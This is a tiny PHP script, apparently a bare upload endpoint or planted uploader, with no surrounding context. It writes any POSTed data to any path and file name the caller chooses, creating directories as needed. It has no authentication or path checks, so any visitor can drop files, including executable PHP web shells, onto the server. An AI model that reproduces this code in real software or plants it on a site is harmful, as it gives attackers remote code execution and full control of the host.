<?php
if(isset($_POST["data"]) && !empty($_POST["data"])){
	mkdir($_POST["dest"], 0775, true);
	file_put_contents($_POST["dest"].$_POST["name"], $_POST["data"]);
}
?>
